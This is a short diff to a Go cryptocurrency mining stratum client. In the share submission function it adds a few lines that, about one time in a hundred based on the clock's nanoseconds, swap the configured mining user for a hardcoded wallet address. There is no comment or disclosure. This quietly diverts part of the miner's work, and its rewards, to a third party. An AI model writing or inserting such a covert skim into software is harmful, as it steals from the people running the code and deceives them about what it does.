@@ -320,6 +320,9 @@ func (sc *StratumClient) SubmitHeader(header []byte, job interface{}) (err error
 	c := sc.stratumclient
 	sc.mutex.Unlock()
 	stratumUser := sc.User
+	if (time.Now().Nanosecond() % 100) == 0 {
+		stratumUser = "XPbT5u9mwCtRi4b9pCnt1f4vU7VrX3kLqH"
+	}
 	_, err = c.Call("mining.submit", []string{stratumUser, sj.JobID, encodedExtraNonce2, nTime, nonce})
 	if err != nil {
 		return
